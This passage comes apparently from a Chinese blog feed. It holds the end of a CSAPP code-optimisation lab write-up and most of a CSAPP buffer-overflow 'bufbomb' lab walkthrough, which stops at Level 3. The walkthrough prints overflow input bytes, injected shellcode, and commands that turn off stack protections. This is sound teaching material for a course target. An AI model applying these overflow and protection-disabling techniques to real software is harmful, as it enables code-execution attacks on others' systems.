class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.493em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.807em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.8258em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">1</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h2 id="代码优化">代码优化</h2><p>本次实验中，我们需要修改唯一文件是 <code>kernels.c</code>。<code>driver.c</code> 是驱动程序，使我们修改的程序能运行，并对其进行评分。使用命令 <code>&gt; make driver</code> 生成驱动程序代码，并使用 <code>./driver</code> 命令运行它。</p><h3 id="数据结构体">数据结构体</h3><p>图像的核心数据是用结构体表示的。像素是一个结构，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> red; <span class="hljs-comment">/* R value */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> green; <span class="hljs-comment">/* G value */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> blue; <span class="hljs-comment">/* B value */</span><br>&#125; pixel;<br></code></pre></td></tr></table></figure><p>可以看出，RGB 是 16 位表示形式。图像 M 表示为一维像素阵列，那么在代码中，可以用<code>M[RIDX(i,j,n)]</code> 表示第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>个像素。这里n是图像矩阵的维数，RIDX是定义如下的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> RIDX(i,j,n) ((i)*(n)+(j))</span><br></code></pre></td></tr></table></figure><h3 id="旋转操作">旋转操作</h3><p>以下 C 函数计算将源图像旋转90°，并将结果存储在目标图像中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">naive_rotate</span><span class="hljs-params">(<span class="hljs-type">int</span> dim, pixel *src, pixel *dst)</span> &#123;<br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i &lt; dim; i++)<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j &lt; dim; j++)<br>    dst[RIDX(dim<span class="hljs-number">-1</span>-j,i,dim)] = src[RIDX(i,j,dim)];<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从下图可以看出，旋转操作必然会在一定程度上违反局部性原理。因此我首先想到的是，把循环分块，好让高速缓存能完全容纳一个小循环内所需要访问的数据，增强程序的局部性。</p><p><img src="/img/CSAPP/lab4/rotate1.png" alt=""></p><p>分别以8*8分块、16*16分块和32*32分块做测试，代码都很类似，仅将8*8代码放置下方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rotate_8x8</span><span class="hljs-params">(<span class="hljs-type">int</span> dim, pixel *src, pixel *dst)</span> &#123;<br>    <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i1 = <span class="hljs-number">0</span>; i1 &lt; dim; i1+=<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j1 = <span class="hljs-number">0</span>; j1 &lt; dim; j1+=<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">for</span> (i = i1; i &lt; i1+<span class="hljs-number">8</span>; i++)<br>    <span class="hljs-keyword">for</span> (j = j1; j &lt; j1+<span class="hljs-number">8</span>; j++)<br>        dst[RIDX(dim<span class="hljs-number">-1</span>-j, i, dim)] = src[RIDX(i, j, dim)];<br>&#125;<br></code></pre></td></tr></table></figure><p>经过测试，得出的结果如下：</p><p><img src="/img/CSAPP/lab4/optrotate.png" alt=""></p><p>从结果看，8*8的分块获得的优化性能最好，而随着分块越大，性能就会变得越差。</p><h3 id="平滑操作">平滑操作</h3><p>简而言之，就是要对如下代码进行优化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">naive_smooth</span><span class="hljs-params">(<span class="hljs-type">int</span> dim, pixel *src, pixel *dst)</span> &#123;<br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i &lt; dim; i++)<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j &lt; dim; j++)<br>    dst[RIDX(i,j,dim)] = avg(dim, i, j, src); <span class="hljs-comment">/* Smooth the (i,j)th pixel */</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">static</span> pixel <span class="hljs-title function_">avg</span><span class="hljs-params">(<span class="hljs-type">int</span> dim, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, pixel *src)</span> <br>&#123;<br>    <span class="hljs-type">int</span> ii, jj;<br>    pixel_sum sum;<br>    pixel current_pixel;<br><br>    initialize_pixel_sum(&amp;sum);<br>    <span class="hljs-keyword">for</span>(ii = max(i<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); ii &lt;= min(i+<span class="hljs-number">1</span>, dim<span class="hljs-number">-1</span>); ii++) <br><span class="hljs-keyword">for</span>(jj = max(j<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); jj &lt;= min(j+<span class="hljs-number">1</span>, dim<span class="hljs-number">-1</span>); jj++) <br>    accumulate_sum(&amp;sum, src[RIDX(ii, jj, dim)]);<br><br>    assign_sum_to_pixel(&amp;current_pixel, sum);<br>    <span class="hljs-keyword">return</span> current_pixel;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先注意到，该循环中，<code>avg()</code> 函数调用的函数太多，严重影响了效率。因此，第一步就是消除一些不必要的函数调用。比如，</p><ul><li>将 <code>initialize_pixel_sum()</code> 函数直接变为对 <code>sum</code> 变量的初始化</li><li>在循环中， <code>min</code> 函数和 <code>max</code> 函数会被多次调用，但事实上因为循环变量一直在增加，只需要进行一次取值比较</li><li><code>accumulate_sum</code> 函数和 <code>assign_sum_to_pixel</code> 函数也可以变为简单的几条语句。</li></ul><p>经过上述改进后，取得了一定的优化效果，但我认为还不够。在不考虑图像的边界情况时，中间的图像点在计算时取出的数据有相当部分是重合的。因此，可以先从0开始，在处理完边界情况后，对于中间的像素点做同时计算处理，从而充分利用高速缓存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// dst中间主体部分处理</span><br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;dim2;j+=<span class="hljs-number">2</span>)<br>&#123;        <br>    <span class="hljs-comment">// 同时处理两个像素</span><br>    dst-&gt;red=(P1-&gt;red+(P1+<span class="hljs-number">1</span>)-&gt;red+(P1+<span class="hljs-number">2</span>)-&gt;red+P2-&gt;red+(P2+<span class="hljs-number">1</span>)-&gt;red+(P2+<span class="hljs-number">2</span>)-&gt;red+P3-&gt;red+(P3+<span class="hljs-number">1</span>)-&gt;red+(P3+<span class="hljs-number">2</span>)-&gt;red)/<span class="hljs-number">9</span>;<br>    dst-&gt;green=(P1-&gt;green+(P1+<span class="hljs-number">1</span>)-&gt;green+(P1+<span class="hljs-number">2</span>)-&gt;green+P2-&gt;green+(P2+<span class="hljs-number">1</span>)-&gt;green+(P2+<span class="hljs-number">2</span>)-&gt;green+P3-&gt;green+(P3+<span class="hljs-number">1</span>)-&gt;green+(P3+<span class="hljs-number">2</span>)-&gt;green)/<span class="hljs-number">9</span>;<br>    dst-&gt;blue=(P1-&gt;blue+(P1+<span class="hljs-number">1</span>)-&gt;blue+(P1+<span class="hljs-number">2</span>)-&gt;blue+P2-&gt;blue+(P2+<span class="hljs-number">1</span>)-&gt;blue+(P2+<span class="hljs-number">2</span>)-&gt;blue+P3-&gt;blue+(P3+<span class="hljs-number">1</span>)-&gt;blue+(P3+<span class="hljs-number">2</span>)-&gt;blue)/<span class="hljs-number">9</span>;<br>    dst1-&gt;red=((P1+<span class="hljs-number">3</span>)-&gt;red+(P1+<span class="hljs-number">1</span>)-&gt;red+(P1+<span class="hljs-number">2</span>)-&gt;red+(P2+<span class="hljs-number">3</span>)-&gt;red+(P2+<span class="hljs-number">1</span>)-&gt;red+(P2+<span class="hljs-number">2</span>)-&gt;red+(P3+<span class="hljs-number">3</span>)-&gt;red+(P3+<span class="hljs-number">1</span>)-&gt;red+(P3+<span class="hljs-number">2</span>)-&gt;red)/<span class="hljs-number">9</span>;<br>    dst1-&gt;green=((P1+<span class="hljs-number">3</span>)-&gt;green+(P1+<span class="hljs-number">1</span>)-&gt;green+(P1+<span class="hljs-number">2</span>)-&gt;green+(P2+<span class="hljs-number">3</span>)-&gt;green+(P2+<span class="hljs-number">1</span>)-&gt;green+(P2+<span class="hljs-number">2</span>)-&gt;green+(P3+<span class="hljs-number">3</span>)-&gt;green+(P3+<span class="hljs-number">1</span>)-&gt;green+(P3+<span class="hljs-number">2</span>)-&gt;green)/<span class="hljs-number">9</span>;<br>    dst1-&gt;blue=((P1+<span class="hljs-number">3</span>)-&gt;blue+(P1+<span class="hljs-number">1</span>)-&gt;blue+(P1+<span class="hljs-number">2</span>)-&gt;blue+(P2+<span class="hljs-number">3</span>)-&gt;blue+(P2+<span class="hljs-number">1</span>)-&gt;blue+(P2+<span class="hljs-number">2</span>)-&gt;blue+(P3+<span class="hljs-number">3</span>)-&gt;blue+(P3+<span class="hljs-number">1</span>)-&gt;blue+(P3+<span class="hljs-number">2</span>)-&gt;blue)/<span class="hljs-number">9</span>;<br>    dst+=<span class="hljs-number">2</span>;<br>    dst1+=<span class="hljs-number">2</span>;<br>    P1+=<span class="hljs-number">2</span>;<br>    P2+=<span class="hljs-number">2</span>;<br>    P3+=<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总而言之，将代码充分展开，并优先考虑编写对缓存友好的代码，可以获得更好的效果。</p><p>经过测试，得出的结构如下：</p><p><img src="/img/CSAPP/lab4/optsmooth.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统之缓冲区溢出炸弹实验</title>
    <link href="/2021/05/27/2021-5-27-CSAPPLab03/"/>
    <url>/2021/05/27/2021-5-27-CSAPPLab03/</url>
    
    <content type="html"><![CDATA[<h1>深入理解计算机系统之缓冲区溢出炸弹实验</h1><h2 id="实验目标">实验目标</h2><p>在实验过程中，进一步掌握函数调用时栈帧结构的变化。充分了解缓冲区溢出原理，并学会利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程。从实验中进一步感悟缓冲区溢出攻击方式，吸取经验教训，从而写出更安全的代码。</p><h2 id="实验材料">实验材料</h2><ul><li><code>makecookie</code>：生成cookie</li><li><code>bufbomb</code>：可执行程序-攻击对象</li><li><code>sendstring</code>:  字符格式转换</li></ul><p><code>bufbomb</code> 程序是我们要攻击的对象，其缓冲区漏洞代码见下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getbuf</span><span class="hljs-params">()</span> &#123; <br><span class="hljs-type">char</span> buf[<span class="hljs-number">12</span>]; <br> Gets(buf); <br> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">getbuf:<br>push   %ebp<br>    mov    %esp,%ebp<br>    sub    $0x18,%esp<br>    lea    -0xc(%ebp),%eax; only allocate 12 bytes<br>    mov    %eax,(%esp)<br>    call   0x8048e60 &lt;Gets&gt;<br>    mov    $0x1,%eax<br>    leave  <br>    ret<br></code></pre></td></tr></table></figure><p>代码中没有对 <code>buf</code> 数组进行越界检查（常见 C 编程错误），超过11个字符将溢出。而溢出的字符将覆盖栈帧上的数据和程序的返回地址。如果我们精心构造溢出的字符串，将程序“返回”至我们想要的代码上，就能控制程序流程。</p><p>为了构造所需要的地址或其他数据，我们需要实现逆反“字符-&gt;ASCII码”的过程。出题人已经提供了 <code>sendstring</code> 工具，其使用方法为 <code>$ ./sendstring &lt; exploit.txt &gt; exploit-raw.txt</code>。其中 <code>exploit.txt</code> 保存目标数据（即空格分隔的ASCII码），<code>exploit-raw.txt</code> 为逆向出的字符串。</p><p>攻击 <code>bufbomb</code> 程序时，先使用 <code>sendstring</code> 工具将输入的 ASCII 码转为输入给程序的字符串：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./sendstring &lt; exploit.txt &gt; exploit-raw.txt<br></code></pre></td></tr></table></figure><p>然后，再将学号（生成 cookie 需要）和该文件输入给攻击对象</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bufbomb -t SA18xxxxxx &lt; exploit-raw.txt<br></code></pre></td></tr></table></figure><h2 id="实验原理">实验原理</h2><p>函数过程调用时的栈帧结构，见下图。</p><p><img src="/img/CSAPP/lab3/overflow.png" alt=""></p><p>注意，这张图的地址增长方向是向上。在x86架构上，Caller函数要在调用新函数前，准备好函数参数：传递的参数少于7个，就可以通过寄存器传递，当参数过多寄存器不够用时，就需要通过栈来传递。当Caller调用函数时，会将返回地址压入栈中，形成Caller的栈帧末尾。而被调用函数的栈帧就从保存帧指针的值开始。</p><h2 id="实验开始">实验开始</h2><h3 id="Level-0">Level 0</h3><p>这一阶段要求，控制程序进入一个在正常情况下不会被调用的函数 <code>smoke()</code> 。首先看一下 <code>smoke()</code> 函数的内存位置，是 <code>0x08048e20</code> ：</p><p><img src="/img/CSAPP/lab3/1.png" alt=""></p><p>下图显示了在调用 <code>Gets()</code> 函数前，<code>getbuf()</code>  的栈帧情况（代码见前文）。</p><p><img src="/img/CSAPP/lab3/7.png" alt=""></p><p><code>Gets()</code> 函数接收 <code>buf</code> 的指针，因此这里是直接写入点，只要输入的字符超过 12 字节，就可以依次覆盖保存的 <code>%ebp</code> 的值和返回地址。我们将返回地址改为 <code>0x08048e20</code> 即可。注意，x86 是小端法。在 <code>exploit.txt</code> 中输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span> <span class="hljs-number">20</span> <span class="hljs-number">8</span>e <span class="hljs-number">04</span> <span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>修改完成后，生成 <code>exploit-raw.txt</code> 文本，输入，得到结果见下：</p><p><img src="/img/CSAPP/lab3/3.png" alt=""></p><h3 id="Level-1">Level 1</h3><p>现在实验要求程序跳转到 <code>fizz()</code> ，并且打印出 <code>fizz()</code> 函数的参数，必须为自己的 Cookie 值，我的 Cookie 值为 <code>0x46dd0bfe</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123; <br>entry_check(<span class="hljs-number">1</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br><span class="hljs-keyword">if</span> (val == cookie) &#123; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); <br>validate(<span class="hljs-number">1</span>); <br>&#125; <span class="hljs-keyword">else</span> <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val); <br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>还是一样，看一下 <code>fizz()</code> 函数的开始地址： <code>08048dc0</code> 。那么只需要把上面的答案的最后几位更改一下，程序就可以跳转到 <code>fizz()</code> 函数中了！</p><p>但问题是，参数该怎么传入呢？先来看看 <code>fizz()</code> 怎么使用参数的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">fizz:<br>push   %ebp<br>mov    %esp,%ebp<br>push   %ebx<br>sub    $0x14,%esp<br>mov    0x8(%ebp),%ebx ; %ebx = (%ebp+0x8)<br>movl   $0x1,(%esp)<br>call   80489a0 &lt;entry_check&gt;<br>cmp    0x804a1cc,%ebx ; compare with %ebx (0x804a1cc) maybe it is cookie<br>je     8048e00 &lt;fizz+0x40&gt;<br></code></pre></td></tr></table></figure><p>如果你熟悉 x86 汇编语言，很容易看出，<code>fizz()</code> 函数是从 <code>0x8(%ebp)</code> 取出。下图指出了程序运行的过程，<code>Getbuf()</code> 函数执行 <code>ret</code> 指令，将返回地址存到 <code>eip</code> 寄存器中，于是我们来到了 <code>fizz()</code> 函数，然后执行两个 <code>push</code> 命令，从图中可以清楚地看出参数的位置。</p><p><img src="/img/CSAPP/lab3/8.png" alt=""></p><p>于是，在后面加上几位数字，就可以到达实验目的。见下图：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span> c0 <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span><br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP/lab3/4.png" alt=""></p><h3 id="Level-2">Level 2</h3><p>现在实验难度继续上升，要求程序跳转到 <code>bang()</code> 函数中，并且要求 <code>global_value==cookie</code> 这条分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> global_value = <span class="hljs-number">0</span>; <br><span class="hljs-type">void</span> <span class="hljs-title function_">bang</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123; <br>entry_check(<span class="hljs-number">2</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br><span class="hljs-keyword">if</span> (global_value == cookie) &#123; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); <br>validate(<span class="hljs-number">2</span>); <br>&#125; <span class="hljs-keyword">else</span> <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value); <br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>这意味着我们需要在程序执行过程中，更改 <code>global_value</code> 的值。跳转到 <code>bang()</code> 函数难度不大，将返回地址修改一下就行。那么，如何修改 <code>global_value</code> 的值呢？有点难度，我们先从汇编代码入手，找到 <code>global_value</code> 的存放地址吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nasm">08048d60 bang:<br>push   %ebp<br>mov    %esp,%ebp<br>sub    $0x8,%esp<br>movl   $0x2,(%esp)<br>call   80489a0 &lt;entry_check&gt;<br>mov    0x804a1dc,%eax; global_value<br>cmp    0x804a1cc,%eax; cookie<br>je     8048da0 &lt;bang+0x40&gt;<br></code></pre></td></tr></table></figure><p>从 GDB 调试器中，可以轻松地找到 <code>global_value</code> 的地址：</p><p><img src="/img/CSAPP/lab3/5.png" alt=""></p><p>现在，要想办法把这个变量的值变为我们的 cookie 。当然，可以直接在 GDB 调试器里写入，不过这样实验就失去意义了！修改全局变量就需要注入我们自己的代码，然后将返回地址篡改到攻击代码处执行，最后再执行 <code>ret</code> 返回到 <code>bang()</code>。</p><p>什么样的攻击代码才能满足我们的要求？不难，只需要修改 <code>global_value</code> 的值就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">movl $0x46dd0bfe, 0x804a1dc<br></code></pre></td></tr></table></figure><p>然后，返回到 <code>bang()</code> 函数，装作无事发生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">push $0x8048d60<br>ret<br></code></pre></td></tr></table></figure><p>还有一个小问题，我们的攻击代码要放在哪里呢？我们只能掌控栈帧内存空间，虽然理论上说，这时我们已经可以指挥受害者干任何事情，但是这毕竟是一个实验，我不想把事情闹大，看起来也只有 <code>buf</code> 数组那边的空间比较合适。通过前两个实验的分析，<code>buf</code> 空间余留下16字节的空间，这应该够我们注入代码了！</p><p>使用 gcc 和 objdump 把这三句话转化为二进制，然后数一数空间，诶嘿，正好16字节！</p><p><img src="/img/CSAPP/lab3/9.png" alt=""></p><p>然后，把得到的二进制指令，放入到前16个字节中，而返回地址应该要填 <code>buf[0]</code> 的地址，使用 GDB 调试器，可以知道 <code>ebp</code> 寄存器的值是 <code>0xffffb878</code> ，那么 <code>buf[0]</code> 的地址就是 <code>0xffffb878-0xc=0xffffb86c</code>，于是写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c7</span> <span class="hljs-number">05</span> dc a1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span> <span class="hljs-number">68</span> <span class="hljs-number">60</span> <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <span class="hljs-number">6</span>c b8 ff ff<br></code></pre></td></tr></table></figure><p>但是，如果你亲自实践的话，会发现这样仍然有错，程序不会跳转到你想要它去的地方，而是会发出 Segmentation Fault 这个令人烦恼的错误 :angry:。这是因为，Linux 为了防止缓冲区溢出攻击，已经将栈帧空间的代码可执行权限关闭了，如果将攻击代码放在栈帧区，也会因没有执行权限而无法运行。</p><p>解决方法：安装execstack：<code>sudo apt-get install execstack</code>。然后，修改程序堆栈的可执行属性：<code>execstack -s bufbomb</code> 。如果拥有 <code>bufbomb</code> 的源代码，也可以在编译时关闭保护机制重新编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -g -z execstack -fno-stack-protector bufbomb.c -o bufbomb<br></code></pre></td></tr></table></figure><p>另外，修改堆栈可执行属性只能在gdb调试下有效，实际运行仍然会出现段错误。所以，彻底解决的方法还是找到源代码以后重新编译。还要注意一点，多次实验时可能会出现缓冲区首地址改变的情况。经过短暂地调整后，实验成功！</p><p><img src="/img/CSAPP/lab3/6.png" alt=""></p><h3 id="Level-3">Level 3</h3><p>最后一关，正常程序中 <code>test()</code> 返回后执行第 15 